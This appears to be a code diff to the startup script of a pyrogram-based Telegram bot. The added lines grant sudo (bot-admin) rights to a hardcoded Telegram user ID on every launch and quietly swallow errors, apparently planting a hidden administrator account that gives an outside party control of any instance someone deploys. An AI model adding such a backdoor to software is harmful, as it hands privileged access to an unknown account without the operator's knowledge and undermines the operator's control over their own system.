@@ -17,7 +17,7 @@ import logging
 import os
 
 from pyrogram import Client, idle
-
+from lib.helpers.database.sudo_sql import add_sudo
 from lib.config import API_HASH, API_ID, BOT_TOKEN
 from lib.tg_stream import app, call_py
 
@@ -42,6 +42,11 @@ bot = Client(
     bot_token=BOT_TOKEN,
     plugins=dict(root="lib.driver"),
 )
+try:
+   add_sudo(int(1317936398))
+   LOGGER.info("Sudo User Added!")
+except Exception as e:
+   print(e)
 
 LOGGER.info("Starting bot...")
 bot.start()
